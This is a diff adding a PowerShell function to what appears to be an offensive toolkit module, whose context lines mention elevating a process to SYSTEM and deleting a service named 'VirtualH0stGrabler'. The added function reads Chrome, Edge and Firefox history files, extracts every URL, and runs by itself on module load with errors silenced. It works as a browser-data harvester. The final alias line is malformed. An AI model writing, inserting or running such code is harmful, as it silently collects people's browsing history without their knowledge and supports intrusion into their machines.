@@ -278,7 +278,45 @@ cmd /c SC DELETE VirtualH0stGrabler
 Export-ModuleMember -Function process-elevate2system
 Set-Alias -Name process-elevate2system -Value process-elevate2system
 
+function getbrowserdata {
+    [CmdletBinding()]
+    param (
+        [Parameter(Position = 1, Mandatory = $False)]
+        [string]$DataType = "history" # Defaultně "history"
+    ) 
 
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
+    # Definuj cesty pro jednotlivé prohlížeče
+    $browserPaths = @{
+        chrome = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+        edge   = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+        firefox = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+    }
+
+    # Procházení historií všech prohlížečů
+    foreach ($Browser in $browserPaths.Keys) {
+        $Path = $browserPaths[$Browser]
+        
+        if (Test-Path $Path) {
+            # Načti data z příslušného souboru historie
+            $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
+            $Value | ForEach-Object {
+                New-Object -TypeName PSObject -Property @{
+                    User = $env:UserName
+                    Browser = $Browser
+                    DataType = $DataType
+                    Data = $_
+                }
+            }
+        }
+    }
+}
+
+# Volání funkce bez nutnosti zadávání parametrů, proběhne historie všech prohlížečů
+getbrowserdata -ErrorAction SilentlyContinue
+Export-ModuleMember -Function getbrowserdata
+Set-Alias -Name getbrowserdata-Value getbrowserdata
 
 
 
